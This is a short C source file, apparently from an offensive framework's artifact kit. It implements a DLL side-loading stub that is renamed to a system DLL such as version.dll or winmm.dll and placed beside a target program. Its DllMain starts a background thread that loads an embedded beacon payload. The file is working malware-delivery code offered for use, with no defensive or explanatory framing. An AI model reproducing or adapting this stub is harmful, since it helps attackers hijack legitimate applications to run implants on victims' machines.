// dll_sideload.c -- Artifact stub: DLL side-loading / search-order hijack.
//
// Rename output to the target DLL (version.dll, winmm.dll, dwrite.dll, etc.)
// and place alongside the application. OS finds it first via DLL search order.
// Beacon loads on a background thread (avoids loader-lock deadlock).

#include "../artifact.h"

ART_DECLARE_PAYLOAD();

static DWORD WINAPI beacon_thread(LPVOID p) {
    (void)p;
    unsigned int sz = art_get_size(g_payload);
    if (!sz) return 1;
    art_load_beacon(g_payload, sz);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        ART_RESOLVE_APIS();
        DisableThreadLibraryCalls(inst);
        if (!art_get_size(g_payload)) return TRUE;
        HANDLE t = CreateThread(NULL, 0, beacon_thread, NULL, 0, NULL);
        if (t) CloseHandle(t);
    }
    return TRUE;
}
